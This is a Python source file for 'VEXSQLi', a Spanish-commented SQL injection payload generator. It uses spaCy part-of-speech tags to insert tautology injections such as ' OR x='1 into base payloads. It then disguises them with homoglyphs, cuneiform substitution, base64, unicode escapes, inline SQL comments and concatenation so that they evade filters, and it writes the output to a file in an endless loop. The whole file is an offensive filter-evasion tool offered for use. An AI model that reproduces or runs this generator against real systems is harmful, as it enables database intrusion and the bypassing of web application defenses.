import argparse
import spacy
import random
import time
from colorama import init, Fore, Style

# Diccionario para la ofuscación
nicode_map = {
    "a": "𒀀", "b": "𒉺", "c": "𒀃", "d": "𒇺", "e": "𒌐", "f": "𒀟", "g": "𒈫", "h": "𒀆", "i": "𒁹", "j": "𒁻",
    "k": "𒁽", "l": "𒁿", "m": "𒂁", "n": "𒂃", "o": "𒂅", "p": "𒂇", "q": "𒂉", "r": "𒂋", "s": "𒂍", "t": "𒂏",
    "u": "𒂑", "v": "𒂓", "w": "𒂕", "x": "𒂗", "y": "𒂙", "z": "𒂛", "A": "𒂝", "B": "𒂟", "C": "𒂡", "D": "𒂣",
    "E": "𒂥", "F": "𒂧", "G": "𒂩", "H": "𒂫", "I": "𒂬", "J": "𒂭", "K": "𒂯", "L": "𒂱", "M": "𒂳", "N": "𒂵",
    "O": "𒂷", "P": "𒂹", "Q": "𒂻", "R": "𒂽", "S": "𒂿", "T": "𒃁", "U": "𒃃", "V": "𒃅", "W": "𒃇", "X": "𒃉",
    "Y": "𒃋", "Z": "𒃍", "0": "𒃏", "1": "𒃑", "2": "𒃓", "3": "𒃕", "4": "𒃗", "5": "𒃙", "6": "𒃛", "7": "𒃝",
    "8": "𒃟", "9": "𒃡", " ": "𒃣", ";": "𒃥", ":": "𒃧", "'": "𒃩", '"': "𒃫", "<": "𒃭", ">": "𒃯", "/": "𒃱",
    "\\": "𒃳", ".": "𒃵", ",": "𒃷", "!": "𒃹", "?": "𒃻", "@": "𒃽", "#": "𒃿", "$": "𒄁", "%": "𒄃", "^": "𒄅",
    "&": "𒄇", "*": "𒄉", "(": "𒄋", ")": "𒄍", "-": "𒄏", "_": "𒄑", "+": "𒄓", "=": "𒄕", "{": "𒄗", "}": "𒄙",
    "[": "𒄛", "]": "𒄝", "|": "𒄟", "~": "𒄡", "`": "𒄣"
}

# Homoglifos para caracteres comunes
homoglyph_map = {
    'a': 'ɑ', 'b': 'Ь', 'c': 'ϲ', 'd': 'ԁ', 'e': 'е', 'f': '𝚏', 'g': 'ɡ', 'h': 'һ', 'i': 'і', 'j': 'ј',
    'k': '𝒌', 'l': 'ⅼ', 'm': 'ｍ', 'n': '𝚗', 'o': 'о', 'p': 'р', 'q': 'ԛ', 'r': '𝚛', 's': 'ѕ', 't': '𝚝',
    'u': '𝚞', 'v': 'ѵ', 'w': 'ԝ', 'x': 'х', 'y': 'у', 'z': '𝚣'
}

# Caracteres inocuos adicionales
innocuous_chars = ['_', '-', '.']

# Cargar modelo de idioma de spaCy
nlp = spacy.load('en_core_web_sm')

def generate_payloads(base_payloads):
    generated_payloads = []

    for payload in base_payloads:
        doc = nlp(payload)

        # Generar variantes del payload
        for token in doc:
            if token.pos_ == 'NOUN' and random.random() < 0.3:
                # Reemplazar nombres propios con payloads SQL alternativos
                generated_payload = payload.replace(token.text, f"' OR {token.text}='1")
                generated_payloads.append(generated_payload)

                # Añadir comillas adicionales
                generated_payload = payload.replace(token.text, f"' OR '{token.text}''='1")
                generated_payloads.append(generated_payload)

            elif token.pos_ == 'VERB' and random.random() < 0.3:
                # Insertar payloads SQL después de verbos
                generated_payload = f"{payload} OR {token.text}='1'"
                generated_payloads.append(generated_payload)

                # Invertir la palabra clave
                generated_payload = f"{payload} OR '{token.text[::-1]}'='1'"
                generated_payloads.append(generated_payload)

            # Ofuscar aleatoriamente algunos caracteres del payload
            if random.random() < 0.2:  # Porcentaje de ofuscación
                generated_payload = random_obfuscate(payload)
                generated_payloads.append(generated_payload)

    return generated_payloads

def random_obfuscate(payload):
    transformations = [
        lambda p: p,                                  # No transformación
        lambda p: obfuscate_text(p),                  # Ofuscar usando nicode_map
        lambda p: homoglyph_replace(p),               # Sustitución de homoglifos
        lambda p: insert_innocuous_chars(p),          # Inserción de caracteres inocuos
        lambda p: reverse_text(p),                    # Inversión de texto
        lambda p: replace_chars(p),                   # Reemplazo de caracteres
        lambda p: base64_encode(p),                   # Codificación Base64
        lambda p: unicode_encode(p),                  # Codificación Unicode
        lambda p: insert_random_spaces(p),            # Inserción de espacios aleatorios
        lambda p: sql_comments(p),                    # Inserción de comentarios SQL
        lambda p: sql_concat(p),                      # Concatenación de cadenas SQL
        lambda p: sql_functions(p)                    # Uso de funciones SQL
    ]

    # Aplicar una transformación aleatoria
    return random.choice(transformations)(payload)

def obfuscate_text(text):
    # Función para ofuscar aleatoriamente texto utilizando nicode_map
    return ''.join([nicode_map[char] if char in nicode_map and random.random() < 0.5 else char for char in text])

def homoglyph_replace(payload):
    # Función para sustituir caracteres comunes con homoglifos
    return ''.join([homoglyph_map[char] if char in homoglyph_map and random.random() < 0.3 else char for char in payload])

def insert_innocuous_chars(payload):
    # Función para insertar caracteres inocuos aleatoriamente
    return ''.join([random.choice([char, random.choice(innocuous_chars)]) if char.isalpha() and random.random() < 0.3 else char for char in payload])

def reverse_text(payload):
    # Función para invertir el orden de los caracteres en el payload
    return payload[::-1]

def replace_chars(payload):
    # Función para reemplazar caracteres con otros caracteres específicos
    char_map = {
        'a': '@',
        'e': '3',
        'i': '1',
        'o': '0',
        's': '$',
        't': '7'
    }
    return ''.join(char_map.get(char, char) for char in payload)

def base64_encode(payload):
    # Función para codificar el payload en Base64
    import base64
    encoded_bytes = base64.b64encode(payload.encode('utf-8'))
    return encoded_bytes.decode('utf-8')

def unicode_encode(payload):
    # Función para codificar el payload en Unicode
    return ''.join(f'\\u{ord(char):04x}' for char in payload)

def insert_random_spaces(payload):
    # Función para insertar espacios aleatorios en el payload
    return ' '.join(payload)

def sql_comments(payload):
    # Función para insertar comentarios SQL en el payload
    parts = payload.split()
    return ' /* random comment */ '.join(parts)

def sql_concat(payload):
    # Función para concatenar cadenas SQL
    parts = payload.split()
    return "||".join(parts)

def sql_functions(payload):
    # Función para usar funciones SQL
    parts = payload.split()
    return "UPPER(" + ")||LOWER(".join(parts) + ")"

def main():
    parser = argparse.ArgumentParser(description='SQL Injection Payload Generator with NLP.')
    parser.add_argument('--payloads', type=str, required=True, help='Archivo con payloads base.')
    parser.add_argument('--out', type=str, required=True, help='Archivo donde guardar los payloads generados.')
    args = parser.parse_args()

    while True:
        with open(args.payloads, 'r') as f:
            base_payloads = [line.strip() for line in f.readlines()]

        generated_payloads = generate_payloads(base_payloads)

        with open(args.out, 'a') as f:  # Usamos 'a' para agregar al archivo existente
            for payload in generated_payloads:
                f.write(payload + '\n')

        print(f'{Fore.YELLOW}Se han generado {len(generated_payloads)} payloads en total. Esperando 5 segundos para generar más...{Style.RESET_ALL}')
        time.sleep(5)  # Espera 5 segundos antes de volver a generar payloads

if __name__ == '__main__':
    # Inicializar colorama para los colores en la consola
    init(autoreset=True)

    # Banner ASCII con el nombre VEXSQLi
    banner = f"""
{Fore.MAGENTA}
██╗   ██╗███████╗██╗  ██╗███████╗ ██████╗ ██╗     ██╗
██║   ██║██╔════╝╚██╗██╔╝██╔════╝██╔═══██╗██║     ██║
██║   ██║█████╗   ╚███╔╝ ███████╗██║   ██║██║     ██║
╚██╗ ██╔╝██╔══╝   ██╔██╗ ╚════██║██║▄▄ ██║██║     ██║
 ╚████╔╝ ███████╗██╔╝ ██╗███████║╚██████╔╝███████╗██║
  ╚═══╝  ╚══════╝╚═╝  ╚═╝╚══════╝ ╚══▀▀═╝ ╚══════╝╚═╝
{Style.RESET_ALL}

{Fore.GREEN}VEXSQLi - Herramienta de Generación de Payloads SQLi{Style.RESET_ALL}
    """
    print(banner)
    print(f"{Fore.YELLOW}Derechos reservados a Agrawain.{Style.RESET_ALL}\n")

    main()
